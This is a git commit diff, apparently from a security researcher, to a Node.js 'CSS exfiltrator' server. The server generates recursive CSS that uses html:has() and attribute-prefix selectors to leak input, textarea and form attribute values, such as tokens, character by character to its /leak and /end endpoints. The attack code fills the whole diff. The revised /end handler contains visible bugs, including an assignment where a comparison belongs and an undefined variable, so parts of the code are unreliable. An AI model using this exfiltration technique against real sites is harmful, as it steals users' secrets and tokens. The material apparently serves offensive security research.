311a9caad3c4985a32e0a765625eb13089ebfa2a
Gareth Heyes <gareth.heyes@portswigger.net>
2023-11-28 08:33:02 +0000

    Removed nth child based CSS as it doesn't work for elements nested differently. Simplified code.

--- css-exfiltrator-server.js
+++ css-exfiltrator-server.js
@@ -3,42 +3,61 @@ const url = require('url');
 const port = 5001;
 
 const HOSTNAME = "http://localhost:5001";
-const DEBUG = false;
-
+const ELEMENTS = ["input","textarea","form"];
+const ATTRIBUTES = {__proto__:null,"input":["name","value"],"textarea":["name","value"],"form":["action"]};
 const MAX_ELEMENTS = 20;
 const MAX_VALUE_LEN = 32;
 const MAX_FORMS = 4;
 const MAX_FORM_ACTION_LEN = 50;
 
-const CHARS = String.fromCodePoint(32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126);
+const CHARS = String.fromCodePoint(32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126).split('');
 
-var selector = "", attribute = "", prefix = "", postfix = "";
 var pending = [];
-var stop = false, ready = 0, n = 0, variables = [];
-
-var discoverCSS = generateDiscoverCSS();
+var stop = false, ready = 0, n = 0, prefixes = {__proto__:null};
+var inputCount = 0, textareaCount = 0, formCount = 0, tokens = [];
 
 const requestHandler = (request, response) => {
     let req = url.parse(request.url, url);
-    log('\treq: %s', request.url);
     if (stop) return response.end();
     switch (req.pathname) {
-        case "/log":
-            response.end();
-        break
-        case "/discover":
-            discoverResponse(response)
-            break;
         case "/start":
+            completedCount = 0;
+            inputCount = 0;
+            textareaCount = 0;
+            formCount = 0;
+            n = 0;
+            tokens = [];
+            prefixes = {__proto__:null};
+            stop = false;
+            ready = 0;
+            pending = [];
             genResponse(response);
+        break;
+        case "/logCount":
+            response.end();
+            if(req.query.inputCount) {
+                inputCount = req.query.inputCount;
+            }
+            if(req.query.textareaCount) {
+                textareaCount = req.query.textareaCount;
+            }
+            if(req.query.formCount) {
+                formCount = req.query.formCount;
+            }
             break;
         case "/leak":
             response.end();
-            if (req.query.pre && prefix !== req.query.pre) {
-                prefix = req.query.pre;
-            } else if (req.query.post && postfix !== req.query.post) {
-               postfix = req.query.post;
-            } else {
+            let hasChanged = false;
+            for (const [element, attributeList] of Object.entries(ATTRIBUTES)) {
+                for(const attribute of attributeList) {                  
+                    const value = prefixes['p_'+element+attribute];     
+                    if(req.query['p_'+element+attribute] !== value) {
+                        prefixes['p_'+element+attribute] = req.query['p_'+element+attribute];
+                        hasChanged = true;
+                    }
+                }
+            }
+            if (!hasChanged) {
                 break;
             }
             if (ready == 2) {
@@ -46,9 +65,9 @@ const requestHandler = (request, response) => {
                 ready = 0;
             } else {
                 ready++;
-                log('\tleak: waiting others...');
+                console.log('\tleak: waiting others...');
             }
-            break;
+        break;
         case "/next":
             if (ready == 2) {
                 genResponse(response);
@@ -56,38 +75,61 @@ const requestHandler = (request, response) => {
             } else {
                 pending.push(response);
                 ready++;
-                log('\tquery: waiting others...');
+                console.log('\tquery: waiting others...');
             }
-            break;
+        break;
         case "/end":
-            stop = true;
-            console.log('[+] END: %s', req.query.token);
+            let total = inputCount + textareaCount + formCount;
+            let actualInputCount = 0, actualTextareaCount = 0, actualFormCount = 0, currentTextareaCount = 0, currentInputCount = 0;
+            for (const [element, attributeList] of Object.entries(ATTRIBUTES)) {
+                for(const attribute of attributeList) {               
+                    const value = tokens.find(e => e.element = element && e.attribute === attribute).token;
+                    if(req.query['token'+element+attribute] !== value) {
+                        let token = req.query['token'+element+attribute];
+                        tokens.push({element,attribute,token});
+                        if(element === 'form') {
+                            actualFormCount++;
+                        } else if(element === 'input') {
+                            currentInputCount++;
+                        } else if(element === 'textarea') {
+                            currentTextareaCount++;
+                        }
+                    }                
+                }
+            }
+
+            actualInputCount = Math.floor(currentInputCount / 2);
+            actualTextareaCount = Math.floor(currentTextareaCount / 2);
+
+            if(actual === total) {
+                stop = true;
+                console.log('[+] END: %s', tokens);
+            }
         default:
             response.end();
     }
 }
 
-const discoverResponse = (response) => {
-    response.writeHead(200, { 'Content-Type': 'text/css'});
-    response.write(discoverCSS);
-    response.end();
-};
-
 const genResponse = (response) => {
-    const hex = [0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f'];
-    console.log('...pre-payoad: ' + prefix);
-    console.log('...post-payoad: ' + postfix);
-    let css = '@import url('+ HOSTNAME + '/next?' + Math.random() + ');' +
-        hex.map(e => (selector + '['+attribute+'$="' + e + postfix + '"]{--e'+n+':url(' + HOSTNAME + '/leak?post=' + e + encodeURIComponent(postfix) + ');}')).join('') +
-        hex.map(e => (selector + '['+attribute+'^="' + prefix + e + '"]{--s'+n+':url(' + HOSTNAME + '/leak?pre=' + encodeURIComponent(prefix) + e +');}')).join('');
-        if(n === 0) {
-            let properties = [];
-            for(let i=0;i<32;i++) {      
-                  properties.push('var(--e'+i+',none),var(--s'+i+',none),var(--full-token,none)');
+    let css = '@import url('+ HOSTNAME + '/next?' + Date.now() + ');';
+    let properties = [];
+    for(let element of ELEMENTS) {
+        for(let attribute of ATTRIBUTES[element]) {           
+            const variablePrefix = '--'+element[0]+'-'+attribute+'-';  
+            const prefix = typeof prefixes['p_'+element+attribute] === 'undefined' ? "" : prefixes['p_'+element+attribute];             
+            css += CHARS.map(e => ('html:has('+element+'['+attribute+'^="' + escapeCSS(prefix + e) + '"])' + '{'+variablePrefix+'s'+n+':url(' + HOSTNAME + '/leak?p_'+element+attribute+'=' + encodeURIComponent(prefix + e) +');}')).join('');
+            if(n === 0) {                            
+                for(let i=1;i<=(element === "form" ? MAX_FORM_ACTION_LEN : MAX_VALUE_LEN);i++) {                              
+                    properties.push('var('+variablePrefix+'s'+n+',none)');
+                }
+                properties.push('var('+variablePrefix+'full-token,none)');   
             }
-            css += `${selector}{background:${properties.join(',')};}`;
-         }
-    css += selector + '['+attribute+'="'+ prefix + postfix + '"]{--full-token:url(' + HOSTNAME + '/end?token=' + encodeURIComponent(prefix) + encodeURIComponent(postfix) + ');}';
+            css += 'html:has(['+attribute+'="'+ prefix + '"]){'+variablePrefix+'full-token:url(' + HOSTNAME + '/end?token'+element+attribute+'=' + encodeURIComponent(prefix) + ');}';
+        }
+    }
+    if(n === 0) {  
+        css += `html{background:${properties.join(',')};}`;
+    }
     response.writeHead(200, { 'Content-Type': 'text/css'});
     response.write(css);
     response.end();
@@ -103,70 +145,6 @@ server.listen(port, (err) => {
     console.log('[+] Server is listening on %d', port);
 })
 
-function log() {
-    if (DEBUG) console.log.apply(console, arguments);
-}
-
 function escapeCSS(str) {
     return str.replace(/(["\\])/,'\\$1');
-}
-
-function discoverElements(elementName, checkName, checkValue, checkAction, elementAmount) {
-    let css = '';
-    for(let i=0;i<CHARS.length;i++) {
-        for(let j=1;j<=elementAmount;j++) {
-            if(checkName) {
-                css += generateRule(elementName, CHARS[i], j, "NameBegins", "name^=");
-                css += generateRule(elementName, CHARS[i], j, "NameEnds", "name$=");
-            }
-            if(checkValue) {
-                css += generateRule(elementName, CHARS[i], j, "ValueBegins", "value^=");
-                css += generateRule(elementName, CHARS[i], j, "ValueEnds", "value$=");
-            }
-            if(checkAction) {
-                css += generateRule(elementName, CHARS[i], j, "ActionBegins", "action^=");
-                css += generateRule(elementName, CHARS[i], j, "ActionEnds", "action$=");
-            }
-        }
-    }
-    if(checkName) {
-        generateTokenVariables(elementName, elementAmount, "NameToken");
-    }
-    if(checkValue) {
-        generateTokenVariables(elementName, elementAmount, "ValueToken");
-    }
-    if(checkAction) {
-        generateTokenVariables(elementName, elementAmount, "ActionToken");
-    }
-    return css;
-}
-
-function generateRule(elementName, character, nth, variableSuffix, attributeSelector) {
-    let variable = '--'+elementName+nth+variableSuffix;
-    let rule = 'html:has('+elementName+'['+attributeSelector+'"'+escapeCSS(character)+'"]:nth-of-type('+nth+')){--'+elementName+nth+variableSuffix+': url(/log?'+elementName+nth+variableSuffix+'='+encodeURIComponent(character)+');}';
-    variables.push(variable);
-    return rule;
-}
-
-function generateTokenVariables(elementName, elementAmount, variableSuffix) {
-    for(let j=1;j<=elementAmount;j++) {
-        variables.push('--'+elementName+j+variableSuffix);
-    }
-}
-
-function generateVariables() {
-    return variables.map(e=>'var('+e+',none)').join(',');
-}
-
-function generateDiscoverCSS() {
-    let css = '';
-    css += discoverElements('form', false, false, true, MAX_FORMS);
-    css += discoverElements('input', true, true, false, MAX_ELEMENTS);
-    css += discoverElements('textarea', true, true, false, MAX_ELEMENTS);
-    css += `
-            html {
-                background:${generateVariables()};
-            }
-    `;
-    return css;
 }
